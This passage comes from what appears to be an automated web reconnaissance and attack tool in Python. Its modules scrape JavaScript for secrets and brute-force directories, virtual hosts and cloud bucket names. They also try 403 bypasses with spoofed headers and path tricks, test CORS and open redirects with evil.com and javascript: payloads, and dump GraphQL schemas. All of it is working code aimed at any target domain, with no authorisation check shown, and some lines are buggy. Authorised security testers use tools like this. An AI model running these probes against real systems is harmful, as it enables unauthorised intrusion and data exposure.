            async with self.semaphore:
                try:
                    content = await http_get(js_url, timeout=15)
                    if not content or len(content) < 50: return
                except Exception: return

                secrets_found   = []
                endpoints_found = []

                # ── Secret detection (46 patterns) ───────────────────────
                for pattern, label in SECRET_PATTERNS:
                    try:
                        matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
                        for m in matches[:3]:
                            match_str = m if isinstance(m, str) else (m[0] if m else "")
                            if not match_str or len(match_str) < 4: continue
                            fps = ["example","test","dummy","placeholder","your_key",
                                   "xxxxxxxx","000000","changeme","sample","<YOUR",
                                   "undefined","null","false","true","EXAMPLE","INSERT"]
                            if any(fp.lower() in match_str.lower() for fp in fps): continue
                            if re.match(r"^(!0|!1|null|undefined|true|false)$", match_str): continue
                            secrets_found.append(f"[{label}] {match_str[:120]}")
                    except Exception: pass

                # ── Endpoint extraction ───────────────────────────────────
                for ep_pat in [
                    r"""['"`](/api/v?[0-9]*/[^\s'"`]{3,})['"`]""",
                    r"""fetch\s*\(['"`]([^\s'"`]{10,})['"`]""",
                    r"""axios\.[a-z]+\s*\(['"`]([^\s'"`]{10,})['"`]""",
                    r"""baseURL\s*[:=]\s*['"`]([^\s'"`]{8,})['"`]""",
                    r"""(?:endpoint|apiUrl)\s*[:=]\s*['"`]([^\s'"`]{8,})['"`]""",
                ]:
                    try:
                        for m in re.findall(ep_pat, content)[:10]:
                            ep_s = m if isinstance(m, str) else ""
                            if ep_s and len(ep_s) > 5 and ep_s not in endpoints_found:
                                endpoints_found.append(ep_s)
                    except Exception: pass

                # ── GraphQL operations ────────────────────────────────────
                if "graphql" in content.lower() or "__schema" in content:
                    ops = re.findall(r"(?:query|mutation|subscription)\s+(\w+)", content)
                    if ops:
                        secrets_found.append(f"[GraphQL Operations] {', '.join(set(ops[:10]))}")

                # ── AWS S3 buckets in JS ──────────────────────────────────
                buckets = re.findall(r"s3\.amazonaws\.com/([a-zA-Z0-9_\-\.]+)", content)
                if buckets:
                    secrets_found.append(f"[AWS S3 Bucket] {', '.join(set(buckets[:5]))}")

                # ── Source map leak ───────────────────────────────────────
                if "sourceMappingURL" in content:
                    sm = re.search(r"sourceMappingURL=(\S+)", content)
                    if sm:
                        secrets_found.append(f"[Source Map] {sm.group(1)[:80]} — leaks source code")

                # ── Debug flags ───────────────────────────────────────────
                if re.search(r"debug\s*[:=]\s*true", content, re.IGNORECASE):
                    secrets_found.append("[Debug Mode Enabled]")
                if re.search(r"NODE_ENV.{0,10}development", content, re.IGNORECASE):
                    secrets_found.append("[Dev Environment Detected]")
                clog = re.search(r"console\.log\([^)]{0,200}(?:password|token|secret)[^)]{0,50}\)", content, re.IGNORECASE)
                if clog:
                    secrets_found.append(f"[Sensitive Data Logged] {clog.group()[:80]}")

                # ── Store results ─────────────────────────────────────────
                has_secret = 1 if secrets_found else 0
                try:
                    self.db.conn.execute("""
                        INSERT OR IGNORE INTO js_files(url,has_secret,secrets,endpoints)
                        VALUES(?,?,?,?)
                    """, (js_url, has_secret,
                          "\n".join(secrets_found[:20]),
                          "\n".join(endpoints_found[:50])))
                    self.db.conn.commit()
                except Exception: pass

                if secrets_found:
                    warn(f"  {C.RED}SECRETS{C.RESET} → {js_url[:80]}")
                    for s in secrets_found[:2]:
                        print(f"    {C.ORANGE}{s[:100]}{C.RESET}")

                # ── LinkFinder for additional endpoints ───────────────────
                if os.path.exists("/opt/LinkFinder/linkfinder.py"):
                    try:
                        lf = run_cmd_sync(["python3","/opt/LinkFinder/linkfinder.py",
                                           "-i",js_url,"-o","cli"], timeout=20)
                        for ep in lf.splitlines()[:50]:
                            if ep.strip() and ep.strip() not in endpoints_found:
                                endpoints_found.append(ep.strip())
                    except Exception: pass

        # Process in batches of 30, up to 500 total JS files
        MAX_JS = 500
        BATCH  = 30
        total  = min(len(js_files), MAX_JS)
        info(f"Analyzing {total}/{len(js_files)} JS files (batches of {BATCH})...")
        for i in range(0, total, BATCH):
            batch = js_files[i:i+BATCH]
            await asyncio.gather(*[analyze_js(u) for u in batch])
            done  = min(i+BATCH, total)
            found_so_far = self.db.count("js_files","has_secret=1")
            print(f"  {C.DIM}JS: {done}/{total} analyzed | {found_so_far} with secrets{C.RESET}", end="\r", flush=True)
        print()

        # Export results
        secret_rows = self.db.conn.execute(
            "SELECT url,secrets FROM js_files WHERE has_secret=1"
        ).fetchall()
        with open(f"{self.outdir}/js/grep_secrets.txt","w") as f:
            for row in secret_rows:
                f.write(f"URL: {row[0]}\n{row[1]}\n\n")

        log(f"JS analysis done → {C.RED}{len(secret_rows)} files with potential secrets{C.RESET}")
        self.db.mark_done("js")

    # ─── MODULE 9: DIRECTORY & FILE ENUMERATION ───────────────────────────
    async def dir_enum(self):
        section("MODULE 9 — DIRECTORY & FILE ENUMERATION")
        if self._skip("dirs"): return

        main_url = f"https://{self.domain}"

        # Sensitive paths check (always run)
        info(f"Checking {len(SENSITIVE_PATHS)} sensitive paths...")
        semaphore = asyncio.Semaphore(30)

        async def check_path(path: str):
            url = f"{main_url}{path}"
            async with semaphore:
                code = await http_head(url, timeout=7)
                if not code:
                    return
                code_s = str(code)
                # 429 = WAF rate-limiting, not a real finding
                # Only count actual responses: 200,204,301,302,307,403,405
                if code in [200,204,301,302,307,403,405,500]:
                    risk, notes = risk_info(url, code_s)
                    self.db.add_sensitive(url, code_s, risk, notes)
                    col = C.RED if risk=="CRITICAL" else (C.ORANGE if risk=="HIGH" else C.YELLOW)
                    print(f"  {col}[{code_s}] [{risk}]{C.RESET} {path}")
                elif code == 429:
                    # WAF/rate-limit — log but mark as unconfirmed
                    self.db.add_sensitive(url, code_s, "UNCONFIRMED", "WAF/rate-limit (429) — recheck manually")

        await asyncio.gather(*[check_path(p) for p in SENSITIVE_PATHS])
        found_count = self.db.count("sensitive_paths")
        log(f"Sensitive paths → {C.BOLD}{found_count} found{C.RESET}")

        # Export sensitive paths
        rows = self.db.conn.execute(
            "SELECT url,status_code,risk_level FROM sensitive_paths ORDER BY risk_level"
        ).fetchall()
        with open(f"{self.outdir}/files/sensitive_paths.txt","w") as f:
            for r in rows:
                f.write(f"[{r[1]}] [{r[2]}] {r[0]}\n")

        if self.skip_brute:
            warn("Brute force skipped (--skip-bruteforce)")
            self.db.mark_done("dirs")
            return

        # ffuf
        # Default: fast small wordlist. User can pass -w for full scan.
        fast_wl  = "/usr/share/wordlists/dirb/common.txt"         # ~4k words  ~30s
        big_wl   = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"  # 220k ~20min
        if self.wordlist and os.path.exists(self.wordlist):
            wl = self.wordlist
        elif os.path.exists(fast_wl):
            wl = fast_wl
            info(f"Using fast wordlist ({fast_wl}) — pass -w <wordlist> for full scan")
        elif os.path.exists(big_wl):
            wl = big_wl
        else:
            wl = ""

        if tool_exists("ffuf") and os.path.exists(wl):
            info("Running ffuf directory brute force...")
            await run_cmd([
                "ffuf","-u",f"{main_url}/FUZZ","-w",wl,
                "-mc","200,204,301,302,403,405","-t",str(self.threads),
                "-o",f"{self.outdir}/files/ffuf_dirs.json","-of","json","-s"
            ], timeout=120)
            log("ffuf → files/ffuf_dirs.json")
        else:
            warn("ffuf or wordlist not found — skipping")

        # gobuster
        if tool_exists("gobuster") and os.path.exists(wl):
            info("Running gobuster...")
            await run_cmd([
                "gobuster","dir","-u",main_url,"-w",wl,
                "-t",str(self.threads),"-q",
                "-o",f"{self.outdir}/files/gobuster_dirs.txt"
            ], timeout=120)
            log("gobuster → files/gobuster_dirs.txt")

        # feroxbuster
        if tool_exists("feroxbuster") and os.path.exists(wl):
            info("Running feroxbuster (recursive)...")
            await run_cmd([
                "feroxbuster","-u",main_url,"-w",wl,
                "--threads",str(self.threads),"--depth","3",
                "--no-state","--silent",
                "-o",f"{self.outdir}/files/feroxbuster.txt"
            ], timeout=120)
            log("feroxbuster → files/feroxbuster.txt")

        self.db.mark_done("dirs")


    # ─── MODULE 14: 403 BYPASS TESTING ────────────────────────────────────
    async def bypass_403(self):
        section("MODULE 14 — 403 BYPASS TESTING")
        if self._skip("bypass_403"): return

        # Collect all 403 URLs from sensitive paths scan
        rows = self.db.conn.execute(
            "SELECT url FROM sensitive_paths WHERE status_code='403'"
        ).fetchall()
        if not rows:
            info("No 403 responses found — skipping bypass tests")
            self.db.mark_done("bypass_403")
            return

        targets = [r[0] for r in rows]
        info(f"Testing {C.CYAN}{len(targets)}{C.RESET} 403-blocked URLs for bypasses...")
        found_bypasses = []

        # Bypass techniques
        HEADER_BYPASSES = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1, 127.0.0.2"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forward-For": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Forwarded": "for=127.0.0.1"},
            {"X-Host": "localhost"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Rewrite-URL": None},  # set to path
            {"X-Original-URL": None},
        ]

        loop = asyncio.get_event_loop()

        async def try_bypass(url: str):
            from urllib.parse import urlparse, urlunparse
            parsed   = urlparse(url)
            path     = parsed.path
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            bypasses_found = []

            def _req(test_url, headers=None, method="GET"):
                try:
                    req = urllib.request.Request(
                        test_url,
                        headers={
                            "User-Agent": "Mozilla/5.0 (ReconX2/2.2.0)",
                            **(headers or {})
                        },
                        method=method
                    )
                    with urllib.request.urlopen(req, timeout=8) as r:
                        return r.status, len(r.read())
                except urllib.error.HTTPError as e:
                    return e.code, 0
                except Exception:
                    return None, 0

            # ── Technique 1: Path manipulation ─────────────────────────
            path_tricks = [
                f"{path}/",
                f"{path}//",
                f"{path}/..",
                f"{path}./",
                f"/{path[1:]}%20",
                f"{path}%20",
                f"{path}?",
                f"{path}#",
                f"{path}/*",
                path.replace("/", "/%2F"),  # URL encode slash
                path.upper(),
                f"/{path[1:2].upper()}{path[2:]}" if len(path) > 2 else path,
                f"/%2e{path}" if path.startswith("/") else path,
                f"{path}..;/",
                f"{path};/",
            ]
            for trick in path_tricks:
                test_url = f"{base_url}{trick}"
                code, size = await loop.run_in_executor(None, _req, test_url)
                if code and code in [200, 204, 301, 302]:
                    bypasses_found.append({
                        "url": url, "bypass": test_url,
                        "technique": f"path: {trick}", "code": code, "size": size
                    })

            # ── Technique 2: Header injection ──────────────────────────
            for header_dict in HEADER_BYPASSES:
                h = dict(header_dict)
                # Set URL-based headers to the path
                for k in h:
                    if h[k] is None:
                        h[k] = path
                code, size = await loop.run_in_executor(None, _req, url, h)
                if code and code in [200, 204]:
                    bypasses_found.append({
                        "url": url, "bypass": url,
                        "technique": f"header: {list(header_dict.keys())[0]}",
                        "code": code, "size": size
                    })

            # ── Technique 3: HTTP method override ──────────────────────
            for method in ["POST", "PUT", "PATCH", "OPTIONS", "TRACE"]:
                code, size = await loop.run_in_executor(None, _req, url, None, method)
                if code and code in [200, 204]:
                    bypasses_found.append({
                        "url": url, "bypass": url,
                        "technique": f"method: {method}", "code": code, "size": size
                    })

            return bypasses_found

        # Run all bypass tests concurrently
        sem = asyncio.Semaphore(20)
        async def run_one(url):
            async with sem:
                return await try_bypass(url)

        results = await asyncio.gather(*[run_one(u) for u in targets[:100]])

        for bypasses in results:
            for b in bypasses:
                found_bypasses.append(b)
                risk = "HIGH" if b["code"] == 200 else "MEDIUM"
                self.db.add_sensitive(
                    b["bypass"],
                    str(b["code"]),
                    risk,
                    f"403 BYPASS via {b['technique']} (original: {b['url']})"
                )
                warn(f"  {C.RED}BYPASS{C.RESET} [{b['code']}] {b['technique']}: {b['bypass'][:70]}")

        # Write report
        bypass_file = f"{self.outdir}/raw/403_bypasses.txt"
        with open(bypass_file, "w") as f:
            for b in found_bypasses:
                f.write(f"[{b['code']}] [{b['technique']}] {b['bypass']}\\n")
                f.write(f"  Original: {b['url']}\\n\\n")

        success(f"403 bypass: {C.GREEN if found_bypasses else C.YELLOW}{len(found_bypasses)}{C.RESET} bypasses found")
        self.db.mark_done("bypass_403")

    # ─── MODULE 15: ACTIVE CORS TESTING ────────────────────────────────────
    async def cors_test(self):
        section("MODULE 15 — ACTIVE CORS TESTING")
        if self._skip("cors_test"): return

        live_urls = self.db.get_live_urls()
        if not live_urls:
            warn("No live hosts — skipping CORS test")
            self.db.mark_done("cors_test")
            return

        info(f"Testing CORS on {C.CYAN}{len(live_urls)}{C.RESET} hosts...")
        cors_findings = []
        loop = asyncio.get_event_loop()

        ORIGIN_TESTS = [
            ("arbitrary",      "https://evil.com"),
            ("null",           "null"),
            ("subdomain",      f"https://evil.{self.domain}"),
            ("trusted-prefix", f"https://{self.domain}.evil.com"),
            ("trusted-suffix", f"https://evil{self.domain}"),
            ("http-version",   f"http://{self.domain}"),
        ]

        def _cors_check(url, origin):
            try:
                req = urllib.request.Request(
                    url,
                    headers={
                        "Origin": origin,
                        "User-Agent": "Mozilla/5.0 (ReconX2/2.2.0)",
                    },
                    method="GET"
                )
                with urllib.request.urlopen(req, timeout=8) as r:
                    hdrs = dict(r.headers)
                    acao = hdrs.get("access-control-allow-origin", "")
                    acac = hdrs.get("access-control-allow-credentials", "")
                    return acao, acac
            except Exception:
                return "", ""

        sem = asyncio.Semaphore(15)
        async def test_host(url):
            async with sem:
                issues = []
                for label, origin in ORIGIN_TESTS:
                    acao, acac = await loop.run_in_executor(None, _cors_check, url, origin)
                    if not acao:
                        continue

                    # Critical: reflects arbitrary origin + allows credentials
                    if (acao == origin or acao == "*") and acac.lower() == "true":
                        severity = "CRITICAL"
                        detail = f"ACAO: {acao} | ACAC: {acac} | Origin: {origin}"
                    # High: reflects attacker origin
                    elif acao == origin and origin not in [f"https://{self.domain}", f"http://{self.domain}"]:
                        severity = "HIGH"
                        detail = f"ACAO reflects {label} origin: {acao}"
                    # High: wildcard with credentials
                    elif acao == "*":
                        severity = "MEDIUM"
                        detail = f"Wildcard ACAO (*) — check if credentials sent"
                    # Medium: null origin accepted
                    elif acao == "null":
                        severity = "HIGH"
                        detail = f"Null origin accepted — CORS misconfiguration"
                    else:
                        continue

                    issues.append((url, severity, detail, origin))

                return issues

        all_results = await asyncio.gather(*[test_host(u) for u in live_urls])
        for issues in all_results:
            for url, sev, detail, origin in issues:
                cors_findings.append((url, sev, detail))
                self.db.add_sensitive(url, "200", sev,
                    f"CORS: {detail}")
                col = C.RED if sev == "CRITICAL" else C.ORANGE
                warn(f"  {col}CORS {sev}{C.RESET} → {url[:60]} | {detail[:60]}")

        with open(f"{self.outdir}/raw/cors_findings.txt", "w") as f:
            for url, sev, detail in cors_findings:
                f.write(f"[{sev}] {url}\\n  {detail}\\n\\n")

        success(f"CORS test: {C.GREEN if cors_findings else C.YELLOW}{len(cors_findings)}{C.RESET} misconfigurations found")
        self.db.mark_done("cors_test")

    # ─── MODULE 16: OPEN REDIRECT TESTING ──────────────────────────────────
    async def open_redirect_test(self):
        section("MODULE 16 — OPEN REDIRECT TESTING")
        if self._skip("open_redirect"): return

        # Get param URLs with redirect-like params
        REDIRECT_PARAMS = {
            "url","redirect","redirect_url","redirect_uri","next","return",
            "return_url","goto","dest","destination","target","rurl","continue",
            "redir","forward","location","callback","back","jump","to","ref",
            "referer","from","out","link","go","r","u"
        }

        all_urls = self.db.conn.execute(
            "SELECT url FROM urls WHERE has_params=1"
        ).fetchall()

        redirect_urls = []
        for row in all_urls:
            url = row[0]
            for param in re.findall(r'[?&]([^=&]+)=', url):
                if param.lower() in REDIRECT_PARAMS:
                    redirect_urls.append((url, param))
                    break

        if not redirect_urls:
            info("No redirect parameters found — skipping")
            self.db.mark_done("open_redirect")
            return

        info(f"Testing {C.CYAN}{len(redirect_urls[:200])}{C.RESET} URLs with redirect params...")

        PAYLOADS = [
            "https://evil.com",
            "//evil.com",
            "//evil.com/%2F..",
            "https://evil.com@" + self.domain,
            "https://" + self.domain + ".evil.com",
            "https://evil%E3%80%82com",     # Unicode dot
            "/%2F%2Fevil.com",
            "\\/\\/evil.com",
            "https:evil.com",
            "javascript:alert(1)",           # XSS via redirect
            "data:text/html,<script>alert(1)</script>",
        ]

        found = []
        loop = asyncio.get_event_loop()

        def _test_redirect(url, param, payload):
            test_url = re.sub(
                rf"([?&]{re.escape(param)}=)[^&]*",
                rf"\\g<1>{urllib.parse.quote(payload, safe=':/@%')}",
                url
            )
            try:
                req = urllib.request.Request(
                    test_url,
                    headers={"User-Agent": "Mozilla/5.0 (ReconX2/2.2.0)"}
                )
                # Don't follow redirects
                opener = urllib.request.build_opener(
                    urllib.request.HTTPRedirectHandler.__new__(
                        type("NoRedir", (urllib.request.HTTPRedirectHandler,), {
                            "redirect_request": lambda *a: None
                        })
                    )
                )
                with opener.open(req, timeout=6) as r:
                    location = r.headers.get("Location", "")
                    if "evil.com" in location or payload in location:
                        return test_url, r.status, location
            except urllib.error.HTTPError as e:
                loc = e.headers.get("Location", "")
                if "evil.com" in loc or payload in loc:
                    return test_url, e.code, loc
            except Exception:
                pass
            return None

        sem = asyncio.Semaphore(20)
        async def test_one(url, param):
            async with sem:
                for payload in PAYLOADS[:5]:  # test top 5 payloads
                    result = await loop.run_in_executor(
                        None, _test_redirect, url, param, payload
                    )
                    if result:
                        return result
            return None

        results = await asyncio.gather(*[test_one(u, p) for u, p in redirect_urls[:200]])
        for r in results:
            if r:
                test_url, code, location = r
                found.append((test_url, code, location))
                self.db.add_sensitive(
                    test_url, str(code), "HIGH",
                    f"Open redirect → {location[:80]}"
                )
                warn(f"  {C.ORANGE}REDIRECT{C.RESET} [{code}] → {location[:70]}")

        with open(f"{self.outdir}/raw/open_redirects.txt", "w") as f:
            for url, code, loc in found:
                f.write(f"[{code}] {url}\\n  Redirects to: {loc}\\n\\n")

        success(f"Open redirect: {C.GREEN if found else C.YELLOW}{len(found)}{C.RESET} found")
        self.db.mark_done("open_redirect")

    # ─── MODULE 17: S3 / CLOUD BUCKET TESTING ──────────────────────────────
    async def cloud_bucket_test(self):
        section("MODULE 17 — CLOUD BUCKET TESTING")
        if self._skip("cloud_buckets"): return

        # Generate bucket name permutations
        base = self.domain.split(".")[0]          # "zomato" from zomato.com
        domain_clean = self.domain.replace(".", "-")  # "zomato-com"

        suffixes = [
            "", "-prod", "-production", "-dev", "-development", "-staging",
            "-test", "-backup", "-backups", "-static", "-assets", "-media",
            "-uploads", "-files", "-data", "-logs", "-archive", "-public",
            "-private", "-internal", "-cdn", "-storage", "-s3", "-bucket",
            "-web", "-api", "-app", "-www", "-resources", "-content",
            "bucket", "-bucket", "-img", "-images", "-video",
        ]
        prefixes = ["", "dev-", "staging-", "prod-", "backup-", "static-"]

        bucket_names = set()
        for pre in prefixes:
            for suf in suffixes:
                bucket_names.add(f"{pre}{base}{suf}")
                bucket_names.add(f"{pre}{domain_clean}{suf}")

        info(f"Testing {C.CYAN}{len(bucket_names)}{C.RESET} bucket name permutations...")
        found_buckets = []
        loop = asyncio.get_event_loop()

        def _check_bucket(name):
            results = []
            endpoints = [
                # AWS S3
                (f"https://{name}.s3.amazonaws.com",           "aws-s3"),
                (f"https://s3.amazonaws.com/{name}",           "aws-s3-path"),
                (f"https://{name}.s3.us-east-1.amazonaws.com", "aws-s3-us-east"),
                # Google Cloud Storage
                (f"https://storage.googleapis.com/{name}",     "gcs"),
                (f"https://{name}.storage.googleapis.com",     "gcs-subdomain"),
                # Azure Blob
                (f"https://{name}.blob.core.windows.net",      "azure-blob"),
                # DigitalOcean Spaces
                (f"https://{name}.nyc3.digitaloceanspaces.com","do-spaces"),
                # Backblaze B2
                (f"https://f000.backblazeb2.com/file/{name}",  "backblaze"),
            ]
            for url, provider in endpoints:
                try:
                    req = urllib.request.Request(
                        url,
                        headers={"User-Agent": "Mozilla/5.0 (ReconX2/2.2.0)"}
                    )
                    with urllib.request.urlopen(req, timeout=6) as r:
                        body = r.read(2000).decode("utf-8", errors="ignore")
                        code = r.status
                        # Check if listable
                        if any(x in body for x in ["<Key>","<Contents>","ListBucket","<?xml"]):
                            results.append((url, provider, "LISTABLE", code, body[:200]))
                        elif code in [200, 204]:
                            results.append((url, provider, "EXISTS", code, ""))
                except urllib.error.HTTPError as e:
                    if e.code == 403:
                        # 403 = bucket exists but access denied
                        results.append((url, provider, "EXISTS_PRIVATE", 403, ""))
                    elif e.code == 400:
                        pass  # bucket doesn't exist
                except Exception:
                    pass
            return results

        sem = asyncio.Semaphore(30)
        async def check_one(name):
            async with sem:
                return await loop.run_in_executor(None, _check_bucket, name)

        all_results = await asyncio.gather(*[check_one(n) for n in bucket_names])
        for results in all_results:
            for url, provider, status, code, snippet in results:
                sev = "CRITICAL" if status == "LISTABLE" else ("HIGH" if status == "EXISTS" else "MEDIUM")
                found_buckets.append((url, provider, status, sev))
                self.db.add_sensitive(
                    url, str(code), sev,
                    f"Cloud bucket [{provider}] status={status}"
                )
                col = C.RED if sev in ["CRITICAL","HIGH"] else C.YELLOW
                warn(f"  {col}BUCKET {status}{C.RESET} [{provider}] {url}")
                if snippet:
                    print(f"    Preview: {snippet[:80]}")

        with open(f"{self.outdir}/raw/cloud_buckets.txt", "w") as f:
            for url, provider, status, sev in found_buckets:
                f.write(f"[{sev}][{status}][{provider}] {url}\\n")

        success(f"Cloud buckets: {C.GREEN if found_buckets else C.YELLOW}{len(found_buckets)}{C.RESET} found")
        self.db.mark_done("cloud_buckets")

    # ─── MODULE 18: GRAPHQL DEEP TESTING ───────────────────────────────────
    async def graphql_test(self):
        section("MODULE 18 — GRAPHQL DEEP TESTING")
        if self._skip("graphql"): return

        # Find all possible GraphQL endpoints
        gql_paths = [
            "/graphql", "/graphiql", "/__graphql", "/api/graphql",
            "/v1/graphql", "/v2/graphql", "/query", "/gql",
            "/api/query", "/graphql/v1", "/graphql/v2",
            "/console", "/playground", "/altair", "/voyager",
        ]

        live_urls = self.db.get_live_urls()
        gql_endpoints = []
        loop = asyncio.get_event_loop()

        # First find live GraphQL endpoints
        info("Discovering GraphQL endpoints...")

        def _probe_gql(base_url, path):
            url = base_url.rstrip("/") + path
            # Standard introspection query
            introspection = {
                "query": """{ __schema { queryType { name } types { name kind } } }"""
            }
            try:
                data = json.dumps(introspection).encode()
                req  = urllib.request.Request(
                    url,
                    data=data,
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (ReconX2/2.2.0)",
                    },
                    method="POST"
                )
                with urllib.request.urlopen(req, timeout=8) as r:
                    body = r.read(10000).decode("utf-8", errors="ignore")
                    if "__schema" in body or "queryType" in body or '"data"' in body:
                        return url, "introspection-enabled", body[:500]
            except urllib.error.HTTPError as e:
                try:
                    body = e.read(500).decode("utf-8", errors="ignore")
                    if "graphql" in body.lower() or "__schema" in body:
                        return url, "exists-auth-required", ""
                except Exception:
                    pass
            except Exception:
                pass
            return None

        sem = asyncio.Semaphore(20)
        async def probe_one(base, path):
            async with sem:
                return await loop.run_in_executor(None, _probe_gql, base, path)

        tasks = [probe_one(base, path) for base in live_urls for path in gql_paths]
        results = await asyncio.gather(*tasks)

        for r in results:
            if r:
                url, status, schema_preview = r
                gql_endpoints.append((url, status, schema_preview))

        if not gql_endpoints:
            info("No GraphQL endpoints found")
            self.db.mark_done("graphql")
            return

        success(f"Found {C.GREEN}{len(gql_endpoints)}{C.RESET} GraphQL endpoints")

        gql_output = []
        for url, status, schema_preview in gql_endpoints:
            sev = "HIGH" if status == "introspection-enabled" else "MEDIUM"
            self.db.add_sensitive(url, "200", sev,
                f"GraphQL endpoint — {status}")
            warn(f"  {C.ORANGE}GraphQL{C.RESET} [{status}] {url}")

            if status == "introspection-enabled":
                # Full introspection — get all types, queries, mutations
                info(f"  Running full introspection on {url}...")
                full_query = {
                    "query": """
                    query IntrospectionQuery {
                      __schema {
                        queryType { name }
                        mutationType { name }
                        subscriptionType { name }
                        types {
                          ...FullType
                        }
                      }
                    }
                    fragment FullType on __Type {
                      kind name description
                      fields(includeDeprecated: true) {
                        name description
                        args { name description type { ...TypeRef } }
                        type { ...TypeRef }
                      }
                      inputFields { name description type { ...TypeRef } }
                      enumValues(includeDeprecated: true) { name description }
                    }
                    fragment TypeRef on __Type {
                      kind name ofType { kind name ofType { kind name } }
                    }
                    """
                }
                def _full_introspect(u, q):
                    try:
                        req = urllib.request.Request(
                            u,
                            data=json.dumps(q).encode(),
                            headers={"Content-Type":"application/json",
                                     "User-Agent":"Mozilla/5.0"},
                            method="POST"
                        )
                        with urllib.request.urlopen(req, timeout=15) as r:
                            return r.read().decode("utf-8","ignore")
                    except Exception: return ""

                schema_json = await loop.run_in_executor(
                    None, _full_introspect, url, full_query
                )
                if schema_json:
                    schema_path = f"{self.outdir}/raw/graphql_schema_{url.replace('/','_').replace(':','')[:50]}.json"
                    with open(schema_path, "w") as f:
                        f.write(schema_json)
                    # Extract type names and mutations
                    type_names = re.findall(r'"name":\s*"([A-Z][a-zA-Z]+)"', schema_json)
                    mutations  = re.findall(r'"mutationType".*?"name":\s*"(\w+)"', schema_json)
                    log(f"  Schema saved → {schema_path}")
                    log(f"  Types: {len(set(type_names))} | Mutations detected: {len(mutations)}")

                    # Flag sensitive type names
                    sensitive_types = [t for t in type_names if any(
                        kw in t.lower() for kw in
                        ["user","admin","password","token","payment","card","secret","key"]
                    )]
                    if sensitive_types:
                        warn(f"  {C.RED}Sensitive types:{C.RESET} {', '.join(set(sensitive_types)[:10])}")

                gql_output.append(f"[{sev}] {url}\\n  Status: {status}\\n  Schema: {schema_path if schema_json else 'N/A'}\\n")
            else:
                gql_output.append(f"[{sev}] {url}\\n  Status: {status}\\n")

        with open(f"{self.outdir}/raw/graphql_findings.txt", "w") as f:
            f.writelines(gql_output)

        self.db.mark_done("graphql")

    # ─── MODULE 19: VIRTUAL HOST BRUTEFORCE ────────────────────────────────
    async def vhost_brute(self):
        section("MODULE 19 — VIRTUAL HOST BRUTEFORCE")
        if self._skip("vhost_brute"): return

        # Get target IP
        target_ip = self.db.get_meta("target_ip", "")
        if not target_ip:
            # Try to resolve
            try:
                target_ip = socket.gethostbyname(self.domain)
            except Exception:
                warn("Cannot resolve target IP — skipping vhost brute")
                self.db.mark_done("vhost_brute")
                return

        info(f"VHost bruteforce on {C.CYAN}{target_ip}{C.RESET}...")

        # Use gobuster if available, otherwise built-in
        if tool_exists("gobuster"):
            # Use a small focused vhost wordlist
            vhost_wl = f"{self.outdir}/raw/vhost_wordlist.txt"
            # Common vhost prefixes
            vhost_prefixes = [
                "admin","api","app","beta","blog","cdn","cms","console",
                "dashboard","data","dev","docs","download","email","ftp",
                "git","gitlab","help","hub","internal","jenkins","jira",
                "kibana","login","mail","manage","monitoring","mysql",
                "ns","ns1","ns2","old","portal","prod","redis","remote",
                "shop","smtp","ssh","staging","status","support","test",
                "vpn","webmail","wiki","www","www2","backend","frontend",
                "mobile","app2","api2","v1","v2","secure","private",
                "files","media","static","assets","upload","downloads",
                "db","database","search","elasticsearch","grafana","sonar",
            ]
            with open(vhost_wl, "w") as f:
                f.write("\\n".join(vhost_prefixes))

            out = await run_cmd([
                "gobuster", "vhost",
                "-u", f"https://{self.domain}",
                "-w", vhost_wl,
                "--domain", self.domain,
                "-t", "30",
                "--timeout", "10s",
                "-q",
            ], timeout=300)

            found_vhosts = []
            for line in out.splitlines():
                if "Found:" in line or "200" in line or "301" in line:
                    host_match = re.search(r"([a-zA-Z0-9\-\.]+\." + re.escape(self.domain) + r")", line)
                    if host_match:
                        vhost = host_match.group(1)
                        found_vhosts.append(vhost)
                        self.db.add_subdomain(vhost, "vhost-brute")
                        info(f"  VHost found: {C.GREEN}{vhost}{C.RESET}")
        else:
            # Built-in vhost probe
            vhost_prefixes = [
                "admin","api","app","beta","dev","docs","internal","jenkins",
                "jira","kibana","mail","manage","monitoring","portal","prod",
                "staging","test","vpn","wiki","www","backend","dashboard",
                "console","elasticsearch","grafana",
            ]

            loop = asyncio.get_event_loop()
            found_vhosts = []

            def _vhost_probe(prefix):
                host = f"{prefix}.{self.domain}"
                found = []
                for port, scheme in [(443,"https"),(80,"http")]:
                    try:
                        url = f"{scheme}://{target_ip}:{port}/"
                        req = urllib.request.Request(
                            url,
                            headers={
                                "Host": host,
                                "User-Agent": "Mozilla/5.0 (ReconX2/2.2.0)"
                            }
                        )
                        with urllib.request.urlopen(req, timeout=6) as r:
                            body = r.read(500).decode("utf-8","ignore")
                            # If different from main domain response, it's a real vhost
                            if r.status in [200, 301, 302, 403]:
                                found.append((host, r.status, scheme, port))
                    except Exception:
                        pass
                return found

            sem = asyncio.Semaphore(20)
            async def probe_vhost(prefix):
                async with sem:
                    return await loop.run_in_executor(None, _vhost_probe, prefix)

            results = await asyncio.gather(*[probe_vhost(p) for p in vhost_prefixes])
            for vhost_list in results:
                for host, code, scheme, port in vhost_list:
                    found_vhosts.append(host)
                    self.db.add_subdomain(host, "vhost-brute")
                    self.db.add_sensitive(
                        f"{scheme}://{host}", str(code), "MEDIUM",
                        f"VHost discovered on {target_ip}:{port}"
                    )
                    info(f"  VHost [{code}]: {C.GREEN}{host}{C.RESET}")

        success(f"VHost brute: {C.GREEN}{len(found_vhosts)}{C.RESET} virtual hosts discovered")
        self.db.mark_done("vhost_brute")

    # ─── MODULE 20: DNS ZONE TRANSFER ──────────────────────────────────────
    async def dns_zone_transfer(self):
        section("MODULE 20 — DNS ZONE TRANSFER (AXFR)")
        if self._skip("dns_axfr"): return

        # Get NS servers from DB
        ns_records = self.db.conn.execute(
            "SELECT value FROM dns_records WHERE record_type='NS'"
        ).fetchall()

        if not ns_records:
